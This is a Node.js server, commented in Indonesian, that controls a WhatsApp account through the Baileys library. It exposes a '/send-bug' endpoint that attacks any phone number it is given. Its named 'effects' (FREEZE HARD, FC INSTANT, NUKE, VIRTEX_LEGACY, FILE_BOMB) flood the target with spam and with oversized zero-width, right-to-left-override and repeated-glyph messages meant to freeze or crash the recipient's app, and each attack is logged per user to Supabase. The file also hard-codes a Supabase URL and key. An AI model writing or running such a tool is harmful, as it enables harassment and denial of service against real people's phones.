const express = require('express');
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, makeInMemoryStore } = require('@whiskeysockets/baileys');
const qrcode = require('qrcode-terminal');
const { createClient } = require('@supabase/supabase-js');
const { Boom } = require('@hapi/boom');
const app = express();
app.use(express.json());

// ============================================================
// KONFIGURASI SUPABASE (SESUAI FRONTEND)
// ============================================================
const SUPABASE_URL = 'https://nxihknuzzmqbdcazikln.supabase.co';
const SUPABASE_ANON_KEY = 'sb_publishable_NnBJVtkGKDp1ZhLVYpxKXg_KMCK9EvO';
const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

// ============================================================
// KONFIGURASI WHATSAPP DENGAN BAILEYS (TANPA PUPPETEER)
// ============================================================
const store = makeInMemoryStore({});
let sock = null;
let isReady = false;

async function connectToWhatsApp() {
    const { state, saveCreds } = await useMultiFileAuthState('auth_info_baileys');
    sock = makeWASocket({
        printQRInTerminal: true,
        auth: state,
        browser: ['MARZ-X Bot', 'Chrome', '1.0.0']
    });

    store.bind(sock.ev);

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect, qr } = update;
        if (qr) {
            console.log('[QR] Scan QR code ini dengan WhatsApp:');
            qrcode.generate(qr, { small: true });
        }
        if (connection === 'close') {
            const shouldReconnect = (lastDisconnect?.error instanceof Boom)?.output?.statusCode !== DisconnectReason.loggedOut;
            if (shouldReconnect) {
                console.log('[INFO] Reconnecting...');
                connectToWhatsApp();
            } else {
                console.log('[INFO] Logged out, scan QR lagi.');
                isReady = false;
            }
        } else if (connection === 'open') {
            console.log('[INFO] Bot WhatsApp siap!');
            isReady = true;
        }
    });

    return sock;
}

connectToWhatsApp();

const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

// ============================================================
// FUNGSI UPDATE STATISTIK KE SUPABASE
// ============================================================
async function updateUserStats(username, effect, target) {
    if (!username) return;
    try {
        const { data: stats, error: fetchError } = await supabase
            .from('users_stats')
            .select('bug_count, tool_count')
            .eq('username', username)
            .single();

        let bugCount = 0, toolCount = 0;
        if (!fetchError && stats) {
            bugCount = stats.bug_count || 0;
            toolCount = stats.tool_count || 0;
        }
        bugCount += 1;

        await supabase
            .from('users_stats')
            .upsert({
                username: username,
                bug_count: bugCount,
                tool_count: toolCount,
                updated_at: new Date().toISOString()
            }, { onConflict: 'username' });

        const detail = `Efek: ${effect}\nTarget: ${target}\nJam: ${new Date().toLocaleString('id-ID', { hour12: false })}`;
        await supabase
            .from('activity_logs')
            .insert({
                username: username,
                type: 'BUG',
                detail: detail,
                status: 'DONE',
                timestamp: new Date().toISOString()
            });

    } catch (err) {
        console.error('[ERROR] Supabase:', err);
    }
}

// ============================================================
// ENDPOINT KIRIM BUG – TANPA EMOJI, PAKAI TEKS
// ============================================================
app.post('/send-bug', async (req, res) => {
    const { targetNumber, effect, username, count = 0 } = req.body;

    if (!isReady || !sock) {
        return res.status(503).json({ error: 'Bot WhatsApp belum siap. Scan QR dulu!' });
    }
    if (!targetNumber) {
        return res.status(400).json({ error: 'Nomor target wajib diisi!' });
    }

    const chatId = targetNumber.includes('@s.whatsapp.net') ? targetNumber : `${targetNumber}@s.whatsapp.net`;
    console.log(`[ACTION] Effect: ${effect} -> Target: ${targetNumber} (user: ${username || 'unknown'})`);

    try {
        // --- DELAY HARD ----------------------------------------------------
        if (effect === 'DELAY HARD') {
            const total = count || 25;
            for (let i = 0; i < total; i++) {
                await sock.sendMessage(chatId, { text: `[DELAY] ${i+1}/${total}` });
                await delay(Math.floor(Math.random() * 700) + 200);
            }
        }

        // --- BLANK HARD ----------------------------------------------------
        else if (effect === 'BLANK HARD') {
            await sock.sendMessage(chatId, { text: '\u200B'.repeat(3000) });
            await sock.sendMessage(chatId, { text: '‎‏‎‏‎‏‎‏‎‏‎‏‎‏'.repeat(200) });
            await sock.sendMessage(chatId, { text: '​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​'.repeat(100) });
        }

        // --- FREEZE HARD ----------------------------------------------------
        else if (effect === 'FREEZE HARD') {
            const total = count || 60;
            for (let i = 0; i < total; i++) {
                await sock.sendMessage(chatId, { text: '.' });
                await delay(15);
            }
        }

        // --- FC INSTANT ----------------------------------------------------
        else if (effect === 'FC INSTANT') {
            await sock.sendMessage(chatId, { text: '*_~teks rusak~_*' + ' '.repeat(300) + '*bold tidak tutup' });
            await sock.sendMessage(chatId, { text: '```bash\n$ echo "hack"\n```' + '\n'.repeat(150) + '```' });
            await sock.sendMessage(chatId, { text: '‎‏‎‏‎‏'.repeat(300) });
            await sock.sendMessage(chatId, { text: 'ဪ'.repeat(2000) });
        }

        // --- RESTART HARD ----------------------------------------------------
        else if (effect === 'RESTART HARD') {
            const total = count || 10;
            for (let i = 0; i < total; i++) {
                await sock.sendMessage(chatId, { text: `[FILE] dummy ${i+1}/${total}` });
                await delay(80);
            }
        }

        // --- BOOTLOOP HARD ----------------------------------------------------
        else if (effect === 'BOOTLOOP HARD') {
            for (let i = 0; i < 30; i++) {
                await sock.sendMessage(chatId, { text: '[LOOP] ' + '\u200B'.repeat(300) });
                await delay(50);
            }
        }

        // --- NUKE -----------------------------------------------------------
        else if (effect === 'NUKE') {
            for (let i = 0; i < 20; i++) {
                await sock.sendMessage(chatId, { text: '[NUKE] ' + '#' .repeat(40) });
                await delay(60);
            }
            await sock.sendMessage(chatId, { text: '\u200B'.repeat(4000) });
            for (let i = 0; i < 50; i++) {
                await sock.sendMessage(chatId, { text: '.' });
                await delay(10);
            }
            await sock.sendMessage(chatId, { text: '*_~rusak~_*' + ' '.repeat(200) + '*' });
        }

        // --- VIRTEX LEGACY ---------------------------------------------------
        else if (effect === 'VIRTEX_LEGACY') {
            await sock.sendMessage(chatId, { text: '\u202E' + 'SERANGAN BALIK' + '\u202D' });
            await sock.sendMessage(chatId, { text: 'ဪ'.repeat(3000) });
            await sock.sendMessage(chatId, { text: '‍'.repeat(2000) });
            await sock.sendMessage(chatId, { text: 'X'.repeat(5000) });
        }

        // --- FILE BOMB -------------------------------------------------------
        else if (effect === 'FILE_BOMB') {
            const total = count || 25;
            for (let i = 0; i < total; i++) {
                await sock.sendMessage(chatId, { text: `[BOMB] ${i+1}/${total}` });
                await delay(30);
            }
        }

        else {
            return res.status(400).json({ error: `Efek "${effect}" tidak dikenal!` });
        }

        // Update statistik Supabase
        if (username) {
            await updateUserStats(username, effect, targetNumber);
        }

        res.json({
            success: true,
            effect: effect,
            target: targetNumber,
            message: `✅ Efek "${effect}" berhasil dikirim ke ${targetNumber}`
        });

    } catch (error) {
        console.error('[ERROR]', error);
        res.status(500).json({
            error: error.message || 'Gagal mengirim efek'
        });
    }
});

// ============================================================
// ENDPOINT CEK STATUS
// ============================================================
app.get('/status', (req, res) => {
    res.json({
        status: isReady ? 'ready' : 'disconnected',
        message: isReady ? 'Bot WhatsApp siap digunakan' : 'Bot belum siap, scan QR dulu'
    });
});

// ============================================================
// JALANKAN SERVER
// ============================================================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`[SERVER] Berjalan di http://localhost:${PORT}`);
    console.log(`[ENDPOINT] POST /send-bug  -> kirim efek`);
    console.log(`[ENDPOINT] GET  /status    -> cek bot`);
});
